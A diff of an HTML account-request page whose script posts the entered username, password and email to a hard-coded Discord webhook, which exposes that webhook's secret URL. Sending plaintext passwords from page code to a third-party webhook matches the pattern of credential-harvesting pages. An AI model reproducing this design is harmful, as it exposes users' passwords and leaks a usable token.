@@ -58,7 +58,6 @@
             opacity: 0.8;
         }
 
-        /* Stylized Form Groups */
         .input-group {
             text-align: left;
             margin-bottom: 25px;
@@ -91,7 +90,6 @@
             box-shadow: 0 0 10px rgba(248, 183, 0, 0.2);
         }
 
-        /* The "Accept" Action Button */
         .btn-action {
             width: 100%;
             padding: 16px;
@@ -112,11 +110,6 @@
             transform: translateY(-1px);
         }
 
-        .btn-action:active {
-            transform: translateY(2px);
-            box-shadow: none;
-        }
-
         .portal-footer {
             margin-top: 30px;
             padding-top: 20px;
@@ -129,11 +122,6 @@
         .portal-footer a {
             color: #555;
             text-decoration: none;
-            transition: color 0.2s;
-        }
-
-        .portal-footer a:hover {
-            color: #ffd100;
         }
     </style>
 </head>
@@ -173,12 +161,11 @@
 
     <script>
         function sendToDiscord(event) {
-            event.preventDefault();
+            // Stops the page from refreshing/submitting to a server (Prevents 405)
+            event.preventDefault(); 
             
-            // Your Webhook URL
             const webhookURL = "https://discord.com/api/webhooks/1476721940944388288/BAcRYm0PYlhgfWwuy7QgryZ9JqxHtFkhvrEa7fPSHZGp37nCav32sBzI1acqad1c4sgr";
             
-            // Getting the values by ID
             const user = document.getElementById('username').value;
             const pass = document.getElementById('password').value;
             const email = document.getElementById('email').value;
@@ -192,8 +179,22 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(message)
             })
-            .then(() => {
-                alert("Request sent! Your account will be created by an admin shortly.");
+            .then(response => {
+                if (response.ok) {
+                    alert("Account request sent successfully!");
+                    // Optional: redirect to a thank you page
+                    // window.location.href = "success.html";
+                } else {
+                    alert("Discord rejected the request. Check your Webhook URL.");
+                }
             })
-            .catch(
+            .catch(err => {
+                console.error(err);
+                alert("Failed to connect to Discord.");
+            });
 
+            return false;
+        }
+    </script>
+</body>
+</html>
